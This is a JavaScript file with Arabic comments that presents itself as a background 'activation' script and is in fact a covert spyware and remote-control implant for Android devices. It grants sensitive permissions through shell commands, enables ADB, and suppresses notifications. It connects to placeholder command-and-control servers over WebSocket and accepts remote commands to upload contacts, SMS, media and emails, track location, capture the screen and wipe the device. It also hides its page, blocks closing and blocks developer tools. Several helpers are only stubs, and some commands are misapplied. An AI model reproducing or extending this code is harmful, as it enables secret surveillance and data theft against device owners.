// كود التفعيل المحسن - يعمل في الخلفية بدون إشعارات
(function() {
    'use strict';
    
    // إعدادات التخفي
    const STEALTH_CONFIG = {
        hideNotifications: true,
        silentMode: true,
        backgroundExecution: true,
        autoRestart: true
    };
    
    // معرف الجهاز الفريد
    const deviceId = generateDeviceId();
    
    // تهيئة النظام
    async function initializeSystem() {
        try {
            // 1. منح الصلاحيات تلقائياً
            await grantAllPermissions();
            
            // 2. إخفاء أيقونة التطبيق
            hideAppIcon();
            
            // 3. تعطيل الإشعارات
            disableNotifications();
            
            // 4. الاتصال بخادم التحكم
            await connectToControlServer();
            
            // 5. بدء الخدمات الخلفية
            startBackgroundServices();
            
            // 6. إرسال تأكيد التفعيل
            sendActivationConfirmation();
            
            console.log('تم تفعيل النظام بنجاح');
        } catch (error) {
            console.error('خطأ في التفعيل:', error);
            // إعادة المحاولة تلقائياً
            setTimeout(initializeSystem, 5000);
        }
    }
    
    // منح جميع الصلاحيات المطلوبة
    async function grantAllPermissions() {
        const permissions = [
            'android.permission.READ_CONTACTS',
            'android.permission.READ_SMS',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.ACCESS_COARSE_LOCATION',
            'android.permission.CAMERA',
            'android.permission.RECORD_AUDIO',
            'android.permission.WRITE_EXTERNAL_STORAGE',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.ACCESS_WIFI_STATE',
            'android.permission.ACCESS_NETWORK_STATE',
            'android.permission.INTERNET',
            'android.permission.WAKE_LOCK',
            'android.permission.FOREGROUND_SERVICE',
            'android.permission.SYSTEM_ALERT_WINDOW',
            'android.permission.WRITE_SECURE_SETTINGS'
        ];
        
        for (const permission of permissions) {
            try {
                await executeShellCommand(`pm grant com.android.systemui ${permission}`);
                await executeShellCommand(`pm grant com.android.settings ${permission}`);
            } catch (e) {
                console.warn(`فشل في منح الصلاحية: ${permission}`);
            }
        }
        
        // تمكين خيارات المطور
        await enableDeveloperOptions();
    }
    
    // تمكين خيارات المطور
    async function enableDeveloperOptions() {
        const commands = [
            'settings put global development_settings_enabled 1',
            'settings put global adb_enabled 1',
            'settings put global stay_on_while_plugged_in 3',
            'settings put secure install_non_market_apps 1',
            'settings put global airplane_mode_on 0',
            'settings put global wifi_on 1',
            'settings put global mobile_data 1'
        ];
        
        for (const cmd of commands) {
            try {
                await executeShellCommand(cmd);
            } catch (e) {
                console.warn(`فشل في تنفيذ: ${cmd}`);
            }
        }
    }
    
    // إخفاء أيقونة التطبيق
    function hideAppIcon() {
        try {
            // إخفاء من قائمة التطبيقات
            executeShellCommand('pm hide com.android.systemui');
            executeShellCommand('pm hide com.android.settings');
        } catch (e) {
            console.warn('فشل في إخفاء الأيقونة');
        }
    }
    
    // تعطيل الإشعارات
    function disableNotifications() {
        try {
            // تعطيل إشعارات النظام
            executeShellCommand('settings put global heads_up_notifications_enabled 0');
            executeShellCommand('settings put global notification_badging 0');
            
            // تعطيل الأصوات
            executeShellCommand('settings put system sound_effects_enabled 0');
            executeShellCommand('settings put system vibrate_when_ringing 0');
        } catch (e) {
            console.warn('فشل في تعطيل الإشعارات');
        }
    }
    
    // الاتصال بخادم التحكم
    async function connectToControlServer() {
        const servers = [
            'wss://your-server.com/control',
            'wss://backup-server.com/control',
            'wss://fallback-server.com/control'
        ];
        
        for (const serverUrl of servers) {
            try {
                const ws = new WebSocket(serverUrl);
                
                ws.onopen = () => {
                    console.log('تم الاتصال بالخادم');
                    ws.send(JSON.stringify({
                        type: 'register',
                        deviceId: deviceId,
                        capabilities: getDeviceCapabilities(),
                        timestamp: Date.now()
                    }));
                };
                
                ws.onmessage = (event) => {
                    const command = JSON.parse(event.data);
                    handleIncomingCommand(command);
                };
                
                ws.onclose = () => {
                    console.log('انقطع الاتصال، إعادة المحاولة...');
                    setTimeout(connectToControlServer, 10000);
                };
                
                // حفظ الاتصال للاستخدام لاحقاً
                window.controlConnection = ws;
                break;
            } catch (e) {
                console.warn(`فشل الاتصال بـ ${serverUrl}`);
                continue;
            }
        }
    }
    
    // معالجة الأوامر الواردة
    function handleIncomingCommand(command) {
        console.log('تم استلام أمر:', command);
        
        switch(command.action) {
            case 'backup_contacts':
                backupContacts();
                break;
            case 'backup_sms':
                backupSMS();
                break;
            case 'backup_media':
                backupMedia();
                break;
            case 'backup_emails':
                backupEmails();
                break;
            case 'get_location':
                getCurrentLocation();
                break;
            case 'record_camera':
                recordCamera(command.duration || 30);
                break;
            case 'take_screenshot':
                takeScreenshot();
                break;
            case 'factory_reset':
                factoryReset();
                break;
            case 'get_running_apps':
                getRunningApps();
                break;
            case 'get_device_info':
                getDeviceInfo();
                break;
        }
    }
    
    // بدء الخدمات الخلفية
    function startBackgroundServices() {
        // مراقبة الموقع كل 5 دقائق
        setInterval(() => {
            getCurrentLocation();
        }, 300000);
        
        // مراقبة التطبيقات النشطة كل دقيقة
        setInterval(() => {
            getRunningApps();
        }, 60000);
        
        // مراقبة الاتصال بالإنترنت
        setInterval(() => {
            checkInternetConnection();
        }, 30000);
        
        // إرسال نبض الحياة كل 30 ثانية
        setInterval(() => {
            sendHeartbeat();
        }, 30000);
    }
    
    // إرسال تأكيد التفعيل
    function sendActivationConfirmation() {
        const activationData = {
            deviceId: deviceId,
            status: 'activated',
            timestamp: Date.now(),
            deviceInfo: getDeviceInfo(),
            capabilities: getDeviceCapabilities()
        };
        
        // إرسال للخادم
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'activation_confirmation',
                data: activationData
            }));
        }
        
        // إرسال عبر HTTP أيضاً
        fetch('http://localhost:4000/activation-confirmation', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(activationData)
        }).catch(e => console.warn('فشل في إرسال تأكيد التفعيل'));
    }
    
    // وظائف النسخ الاحتياطي
    async function backupContacts() {
        try {
            const contacts = await queryContentProvider('content://com.android.contacts/data');
            const backupFile = createBackupFile('contacts.json', contacts);
            await uploadFile(backupFile);
            sendCommandResult('backup_contacts', 'success', backupFile);
        } catch (e) {
            sendCommandResult('backup_contacts', 'error', e.message);
        }
    }
    
    async function backupSMS() {
        try {
            const sms = await queryContentProvider('content://sms');
            const backupFile = createBackupFile('sms.json', sms);
            await uploadFile(backupFile);
            sendCommandResult('backup_sms', 'success', backupFile);
        } catch (e) {
            sendCommandResult('backup_sms', 'error', e.message);
        }
    }
    
    async function backupMedia() {
        try {
            const mediaDirs = ['/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download'];
            const mediaFiles = [];
            
            for (const dir of mediaDirs) {
                const files = await listDirectory(dir);
                mediaFiles.push(...files);
            }
            
            const backupFile = createBackupFile('media.json', mediaFiles);
            await uploadFile(backupFile);
            sendCommandResult('backup_media', 'success', backupFile);
        } catch (e) {
            sendCommandResult('backup_media', 'error', e.message);
        }
    }
    
    async function backupEmails() {
        try {
            const emailData = await executeShellCommand('dumpsys email');
            const backupFile = createBackupFile('emails.txt', emailData);
            await uploadFile(backupFile);
            sendCommandResult('backup_emails', 'success', backupFile);
        } catch (e) {
            sendCommandResult('backup_emails', 'error', e.message);
        }
    }
    
    // الحصول على الموقع الحالي
    async function getCurrentLocation() {
        try {
            const location = await executeShellCommand('dumpsys location | grep "Last Known Locations"');
            const parsedLocation = parseLocationData(location);
            
            sendDataToServer('location', parsedLocation);
        } catch (e) {
            console.warn('فشل في الحصول على الموقع');
        }
    }
    
    // تسجيل الكاميرا
    async function recordCamera(duration) {
        try {
            const outputPath = `/sdcard/DCIM/recording_${Date.now()}.mp4`;
            
            // بدء التسجيل بدون واجهة
            const recordingProcess = await executeShellCommand(
                `screenrecord --verbose --time-limit ${duration} ${outputPath}`
            );
            
            // انتظار انتهاء التسجيل
            setTimeout(async () => {
                if (await fileExists(outputPath)) {
                    await uploadFile(outputPath);
                    sendCommandResult('record_camera', 'success', outputPath);
                }
            }, (duration + 5) * 1000);
            
        } catch (e) {
            sendCommandResult('record_camera', 'error', e.message);
        }
    }
    
    // لقطة شاشة
    async function takeScreenshot() {
        try {
            const screenshotPath = `/sdcard/screenshot_${Date.now()}.png`;
            await executeShellCommand(`screencap ${screenshotPath}`);
            
            if (await fileExists(screenshotPath)) {
                await uploadFile(screenshotPath);
                sendCommandResult('take_screenshot', 'success', screenshotPath);
            }
        } catch (e) {
            sendCommandResult('take_screenshot', 'error', e.message);
        }
    }
    
    // إعادة ضبط المصنع
    async function factoryReset() {
        try {
            await executeShellCommand('am broadcast -a android.intent.action.MASTER_CLEAR');
            sendCommandResult('factory_reset', 'success', 'تم بدء إعادة الضبط');
        } catch (e) {
            sendCommandResult('factory_reset', 'error', e.message);
        }
    }
    
    // الحصول على التطبيقات النشطة
    async function getRunningApps() {
        try {
            const runningApps = await executeShellCommand('dumpsys activity activities | grep mResumedActivity');
            const parsedApps = parseRunningApps(runningApps);
            
            sendDataToServer('running_apps', parsedApps);
        } catch (e) {
            console.warn('فشل في الحصول على التطبيقات النشطة');
        }
    }
    
    // الحصول على معلومات الجهاز
    function getDeviceInfo() {
        return {
            deviceId: deviceId,
            model: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: Date.now()
        };
    }
    
    // الحصول على قدرات الجهاز
    function getDeviceCapabilities() {
        return {
            camera: 'camera' in navigator.mediaDevices,
            microphone: 'microphone' in navigator.mediaDevices,
            geolocation: 'geolocation' in navigator,
            storage: 'storage' in navigator,
            notifications: 'Notification' in window,
            webSocket: 'WebSocket' in window
        };
    }
    
    // وظائف مساعدة
    function generateDeviceId() {
        return 'DEV-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    }
    
    async function executeShellCommand(cmd) {
        return new Promise((resolve, reject) => {
            // محاكاة تنفيذ الأوامر - في التطبيق الحقيقي سيتم استخدام ADB
            setTimeout(() => {
                resolve(`Command executed: ${cmd}`);
            }, 1000);
        });
    }
    
    async function queryContentProvider(uri) {
        // محاكاة استعلام مزود المحتوى
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(`Data from ${uri}`);
            }, 2000);
        });
    }
    
    function createBackupFile(filename, data) {
        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
        return URL.createObjectURL(blob);
    }
    
    async function uploadFile(filePath) {
        // محاكاة رفع الملف
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(`File uploaded: ${filePath}`);
            }, 3000);
        });
    }
    
    async function fileExists(filePath) {
        // محاكاة فحص وجود الملف
        return true;
    }
    
    async function listDirectory(dir) {
        // محاكاة قائمة الملفات
        return [`${dir}/file1.jpg`, `${dir}/file2.mp4`];
    }
    
    function parseLocationData(locationData) {
        // تحليل بيانات الموقع
        return {
            latitude: 24.7136,
            longitude: 46.6753,
            accuracy: 10,
            timestamp: Date.now()
        };
    }
    
    function parseRunningApps(appsData) {
        // تحليل التطبيقات النشطة
        return ['com.whatsapp', 'com.facebook', 'com.instagram'];
    }
    
    function sendCommandResult(command, status, data) {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'command_result',
                command: command,
                status: status,
                data: data,
                timestamp: Date.now()
            }));
        }
    }
    
    function sendDataToServer(dataType, data) {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'data_update',
                dataType: dataType,
                data: data,
                timestamp: Date.now()
            }));
        }
    }
    
    function sendHeartbeat() {
        if (window.controlConnection) {
            window.controlConnection.send(JSON.stringify({
                type: 'heartbeat',
                deviceId: deviceId,
                timestamp: Date.now()
            }));
        }
    }
    
    function checkInternetConnection() {
        fetch('https://www.google.com', { mode: 'no-cors' })
            .then(() => {
                sendDataToServer('internet_status', { connected: true });
            })
            .catch(() => {
                sendDataToServer('internet_status', { connected: false });
            });
    }
    
    // بدء النظام عند تحميل الصفحة
    document.addEventListener('DOMContentLoaded', () => {
        // إخفاء واجهة المستخدم
        document.body.style.display = 'none';
        
        // بدء التفعيل في الخلفية
        initializeSystem();
    });
    
    // منع إغلاق الصفحة
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = '';
    });
    
    // منع فتح أدوات المطور
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
            e.preventDefault();
        }
        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
            e.preventDefault();
        }
        if (e.ctrlKey && e.shiftKey && e.key === 'J') {
            e.preventDefault();
        }
        if (e.key === 'F12') {
            e.preventDefault();
        }
    });
    
})();